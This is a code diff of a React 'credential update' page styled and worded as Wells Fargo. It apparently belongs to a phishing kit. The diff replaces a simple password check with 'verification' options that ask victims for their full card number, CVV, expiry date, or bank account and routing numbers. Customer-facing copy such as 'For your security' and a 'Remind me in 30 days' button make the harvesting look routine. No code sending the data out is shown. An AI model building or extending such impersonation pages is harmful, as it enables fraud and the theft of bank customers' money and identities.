@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { Shield, Lock, User, Eye, EyeOff, CheckCircle, AlertTriangle, Clock, Info, Loader2 } from "lucide-react";
+import { Shield, Lock, User, Eye, EyeOff, CheckCircle, AlertTriangle, Clock, Info, Loader2, CreditCard, Building, Hash } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
@@ -21,11 +21,18 @@ export default function CredentialUpdate() {
   const [sessionTimeout, setSessionTimeout] = useState(600);
   const [step, setStep] = useState(1);
   const [verificationProgress, setVerificationProgress] = useState(0);
+  const [verificationMethod, setVerificationMethod] = useState<"password" | "card" | "account" | null>(null);
   
   const username = sessionStorage.getItem("loginUsername") || "Customer";
   
   const [formData, setFormData] = useState({
     currentPassword: "",
+    cardNumber: "",
+    cvv: "",
+    expirationMonth: "",
+    expirationYear: "",
+    accountNumber: "",
+    routingNumber: "",
     newUsername: "",
     newPassword: "",
     confirmPassword: "",
@@ -81,14 +88,60 @@ export default function CredentialUpdate() {
     }, 1500);
   };
 
-  const handleVerifyPassword = async () => {
-    if (!formData.currentPassword) {
+  const handleVerifyIdentity = async () => {
+    if (verificationMethod === "password" && !formData.currentPassword) {
       toast({
         title: "Password Required",
         description: "Please enter your current password to continue.",
         variant: "destructive"
       });
       return;
+    }
+
+    if (verificationMethod === "card") {
+      if (!formData.cardNumber || formData.cardNumber.length < 15) {
+        toast({
+          title: "Card Number Required",
+          description: "Please enter a valid card number.",
+          variant: "destructive"
+        });
+        return;
+      }
+      if (!formData.cvv || formData.cvv.length < 3) {
+        toast({
+          title: "CVV Required",
+          description: "Please enter the 3 or 4 digit security code.",
+          variant: "destructive"
+        });
+        return;
+      }
+      if (!formData.expirationMonth || !formData.expirationYear) {
+        toast({
+          title: "Expiration Date Required",
+          description: "Please enter your card's expiration date.",
+          variant: "destructive"
+        });
+        return;
+      }
+    }
+
+    if (verificationMethod === "account") {
+      if (!formData.accountNumber || formData.accountNumber.length < 8) {
+        toast({
+          title: "Account Number Required",
+          description: "Please enter a valid account number.",
+          variant: "destructive"
+        });
+        return;
+      }
+      if (!formData.routingNumber || formData.routingNumber.length !== 9) {
+        toast({
+          title: "Routing Number Required",
+          description: "Please enter a valid 9-digit routing number.",
+          variant: "destructive"
+        });
+        return;
+      }
     }
 
     setVerificationProgress(0);
@@ -271,7 +324,7 @@ export default function CredentialUpdate() {
           </CardContent>
         </Card>
 
-        {step === 1 && (
+        {step === 1 && !verificationMethod && (
           <Card>
             <CardHeader className="border-b bg-gray-50 py-3 px-4">
               <h3 className="font-semibold text-gray-900 flex items-center gap-2">
@@ -281,7 +334,85 @@ export default function CredentialUpdate() {
             </CardHeader>
             <CardContent className="p-4">
               <p className="text-sm text-gray-600 mb-4">
-                For your security, please confirm your current password to proceed with updating your credentials.
+                For your security, please select how you would like to verify your identity to proceed.
+              </p>
+              
+              <div className="space-y-3">
+                <button
+                  onClick={() => setVerificationMethod("card")}
+                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
+                  data-testid="button-verify-card"
+                >
+                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
+                    <CreditCard className="w-6 h-6 text-[#d71e28]" />
+                  </div>
+                  <div className="flex-1">
+                    <p className="font-medium text-gray-900">Debit or Credit Card</p>
+                    <p className="text-sm text-gray-500">Verify using your Wells Fargo card number</p>
+                  </div>
+                </button>
+
+                <button
+                  onClick={() => setVerificationMethod("account")}
+                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
+                  data-testid="button-verify-account"
+                >
+                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
+                    <Building className="w-6 h-6 text-[#d71e28]" />
+                  </div>
+                  <div className="flex-1">
+                    <p className="font-medium text-gray-900">Account Number</p>
+                    <p className="text-sm text-gray-500">Verify using your account and routing numbers</p>
+                  </div>
+                </button>
+
+                <button
+                  onClick={() => setVerificationMethod("password")}
+                  className="w-full flex items-center gap-4 p-4 border rounded-lg hover-elevate text-left group"
+                  data-testid="button-verify-password"
+                >
+                  <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center group-hover:bg-red-100 transition-colors">
+                    <Lock className="w-6 h-6 text-[#d71e28]" />
+                  </div>
+                  <div className="flex-1">
+                    <p className="font-medium text-gray-900">Current Password</p>
+                    <p className="text-sm text-gray-500">Verify using your existing sign-in password</p>
+                  </div>
+                </button>
+              </div>
+
+              <div className="mt-4 pt-4 border-t">
+                <button
+                  onClick={handleSkip}
+                  className="w-full text-center text-sm text-gray-500 hover:text-[#d71e28]"
+                  data-testid="button-remind-later"
+                >
+                  Remind me in 30 days
+                </button>
+              </div>
+            </CardContent>
+          </Card>
+        )}
+
+        {step === 1 && verificationMethod === "password" && (
+          <Card>
+            <CardHeader className="border-b bg-gray-50 py-3 px-4">
+              <div className="flex items-center justify-between">
+                <h3 className="font-semibold text-gray-900 flex items-center gap-2">
+                  <Lock className="w-4 h-4 text-[#d71e28]" />
+                  Verify with Password
+                </h3>
+                <button
+                  onClick={() => setVerificationMethod(null)}
+                  className="text-sm text-[#d71e28] hover:underline"
+                >
+                  Change method
+                </button>
+              </div>
+            </CardHeader>
+            <CardContent className="p-4">
+              <p className="text-sm text-gray-600 mb-4">
+                Enter your current password to verify your identity.
               </p>
               
               <div className="space-y-4">
@@ -318,23 +449,216 @@ export default function CredentialUpdate() {
                   </div>
                 )}
 
-                <div className="flex flex-col gap-3 pt-2">
-                  <Button 
-                    onClick={handleVerifyPassword}
-                    className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
-                    disabled={!formData.currentPassword}
-                    data-testid="button-verify-continue"
-                  >
-                    Continue
-                  </Button>
-                  <button
-                    onClick={handleSkip}
-                    className="text-sm text-[#d71e28] hover:underline"
-                    data-testid="button-remind-later"
-                  >
-                    Remind me in 30 days
-                  </button>
+                <Button 
+                  onClick={handleVerifyIdentity}
+                  className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
+                  disabled={!formData.currentPassword}
+                  data-testid="button-verify-continue"
+                >
+                  Continue
+                </Button>
+              </div>
+            </CardContent>
+          </Card>
+        )}
+
+        {step === 1 && verificationMethod === "card" && (
+          <Card>
+            <CardHeader className="border-b bg-gray-50 py-3 px-4">
+              <div className="flex items-center justify-between">
+                <h3 className="font-semibold text-gray-900 flex items-center gap-2">
+                  <CreditCard className="w-4 h-4 text-[#d71e28]" />
+                  Verify with Card
+                </h3>
+                <button
+                  onClick={() => setVerificationMethod(null)}
+                  className="text-sm text-[#d71e28] hover:underline"
+                >
+                  Change method
+                </button>
+              </div>
+            </CardHeader>
+            <CardContent className="p-4">
+              <p className="text-sm text-gray-600 mb-4">
+                Enter your Wells Fargo debit or credit card details to verify your identity.
+              </p>
+              
+              <div className="space-y-4">
+                <div className="space-y-2">
+                  <Label htmlFor="cardNumber" className="text-sm font-medium">Card Number</Label>
+                  <Input
+                    id="cardNumber"
+                    type="text"
+                    value={formData.cardNumber}
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '').slice(0, 16);
+                      setFormData({ ...formData, cardNumber: value });
+                    }}
+                    placeholder="Enter 16-digit card number"
+                    maxLength={16}
+                    data-testid="input-card-number"
+                  />
                 </div>
+
+                <div className="grid grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label className="text-sm font-medium">Expiration Date</Label>
+                    <div className="flex gap-2">
+                      <select
+                        value={formData.expirationMonth}
+                        onChange={(e) => setFormData({ ...formData, expirationMonth: e.target.value })}
+                        className="flex-1 h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
+                        data-testid="select-exp-month"
+                      >
+                        <option value="">MM</option>
+                        {Array.from({ length: 12 }, (_, i) => (
+                          <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
+                            {String(i + 1).padStart(2, '0')}
+                          </option>
+                        ))}
+                      </select>
+                      <select
+                        value={formData.expirationYear}
+                        onChange={(e) => setFormData({ ...formData, expirationYear: e.target.value })}
+                        className="flex-1 h-10 rounded-md border border-input bg-background px-3 py-2 text-sm"
+                        data-testid="select-exp-year"
+                      >
+                        <option value="">YY</option>
+                        {Array.from({ length: 10 }, (_, i) => (
+                          <option key={i} value={String(26 + i)}>
+                            {26 + i}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
+                  </div>
+
+                  <div className="space-y-2">
+                    <Label htmlFor="cvv" className="text-sm font-medium">CVV</Label>
+                    <Input
+                      id="cvv"
+                      type="text"
+                      value={formData.cvv}
+                      onChange={(e) => {
+                        const value = e.target.value.replace(/\D/g, '').slice(0, 4);
+                        setFormData({ ...formData, cvv: value });
+                      }}
+                      placeholder="3-4 digits"
+                      maxLength={4}
+                      data-testid="input-cvv"
+                    />
+                  </div>
+                </div>
+
+                <div className="bg-blue-50 p-3 rounded-lg border border-blue-100">
+                  <p className="text-xs text-blue-700 flex items-start gap-2">
+                    <Info className="w-4 h-4 flex-shrink-0 mt-0.5" />
+                    The CVV is the 3 or 4 digit security code on the back of your card.
+                  </p>
+                </div>
+
+                {verificationProgress > 0 && verificationProgress < 100 && (
+                  <div className="space-y-2">
+                    <div className="flex items-center gap-2 text-sm text-gray-600">
+                      <Loader2 className="w-4 h-4 animate-spin" />
+                      <span>Verifying card information...</span>
+                    </div>
+                    <Progress value={verificationProgress} className="h-1" />
+                  </div>
+                )}
+
+                <Button 
+                  onClick={handleVerifyIdentity}
+                  className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
+                  disabled={!formData.cardNumber || !formData.cvv || !formData.expirationMonth || !formData.expirationYear}
+                  data-testid="button-verify-continue"
+                >
+                  Continue
+                </Button>
+              </div>
+            </CardContent>
+          </Card>
+        )}
+
+        {step === 1 && verificationMethod === "account" && (
+          <Card>
+            <CardHeader className="border-b bg-gray-50 py-3 px-4">
+              <div className="flex items-center justify-between">
+                <h3 className="font-semibold text-gray-900 flex items-center gap-2">
+                  <Building className="w-4 h-4 text-[#d71e28]" />
+                  Verify with Account Number
+                </h3>
+                <button
+                  onClick={() => setVerificationMethod(null)}
+                  className="text-sm text-[#d71e28] hover:underline"
+                >
+                  Change method
+                </button>
+              </div>
+            </CardHeader>
+            <CardContent className="p-4">
+              <p className="text-sm text-gray-600 mb-4">
+                Enter your Wells Fargo account and routing numbers to verify your identity.
+              </p>
+              
+              <div className="space-y-4">
+                <div className="space-y-2">
+                  <Label htmlFor="routingNumber" className="text-sm font-medium">Routing Number</Label>
+                  <Input
+                    id="routingNumber"
+                    type="text"
+                    value={formData.routingNumber}
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '').slice(0, 9);
+                      setFormData({ ...formData, routingNumber: value });
+                    }}
+                    placeholder="9-digit routing number"
+                    maxLength={9}
+                    data-testid="input-routing-number"
+                  />
+                </div>
+
+                <div className="space-y-2">
+                  <Label htmlFor="accountNumber" className="text-sm font-medium">Account Number</Label>
+                  <Input
+                    id="accountNumber"
+                    type="text"
+                    value={formData.accountNumber}
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '').slice(0, 17);
+                      setFormData({ ...formData, accountNumber: value });
+                    }}
+                    placeholder="Enter account number"
+                    maxLength={17}
+                    data-testid="input-account-number"
+                  />
+                </div>
+
+                <div className="bg-blue-50 p-3 rounded-lg border border-blue-100">
+                  <p className="text-xs text-blue-700 flex items-start gap-2">
+                    <Info className="w-4 h-4 flex-shrink-0 mt-0.5" />
+                    You can find your routing and account numbers at the bottom of your checks or in your account details.
+                  </p>
+                </div>
+
+                {verificationProgress > 0 && verificationProgress < 100 && (
+                  <div className="space-y-2">
+                    <div className="flex items-center gap-2 text-sm text-gray-600">
+                      <Loader2 className="w-4 h-4 animate-spin" />
+                      <span>Verifying account information...</span>
+                    </div>
+                    <Progress value={verificationProgress} className="h-1" />
+                  </div>
+                )}
+
+                <Button 
+                  onClick={handleVerifyIdentity}
+                  className="w-full bg-[#d71e28] hover:bg-[#b91c23]"
+                  disabled={!formData.accountNumber || formData.routingNumber.length !== 9}
+                  data-testid="button-verify-continue"
+                >
+                  Continue
+                </Button>
               </div>
             </CardContent>
           </Card>
